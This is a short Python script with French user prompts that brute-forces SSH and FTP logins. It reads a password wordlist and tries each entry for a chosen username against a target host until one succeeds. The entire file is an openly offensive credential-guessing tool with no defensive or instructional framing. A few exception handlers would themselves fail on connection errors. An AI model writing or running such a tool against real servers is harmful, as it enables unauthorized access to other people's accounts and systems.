import paramiko
from ftplib import FTP

def brute_ssh(host, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password)
        print("[*] Successfully logged in via SSH!")
        return True
    except paramiko.AuthenticationException:
        print("[!] Invalid credentials for SSH")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        client.close()

def brute_ftp(host, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(host, port)
        ftp.login(username, password)
        print("[*] Successfully logged in via FTP!")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        ftp.quit()

def main():
    protocol = input("Choisissez le protocole à bruteforcer (SSH ou FTP) : ").strip().lower()
    host = input("Entrez l'adresse IP du serveur : ")
    port = int(input("Entrez le port du serveur : "))
    username = input("Entrez le nom d'utilisateur : ")
    password_list = input("Entrez le chemin du fichier contenant les mots de passe : ")

    with open(password_list, 'r') as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()
        if protocol == 'ssh':
            if brute_ssh(host, port, username, password):
                break
        elif protocol == 'ftp':
            if brute_ftp(host, port, username, password):
                break
        else:
            print("[!] Protocole invalide, veuillez choisir entre SSH ou FTP")

if __name__ == "__main__":
    main()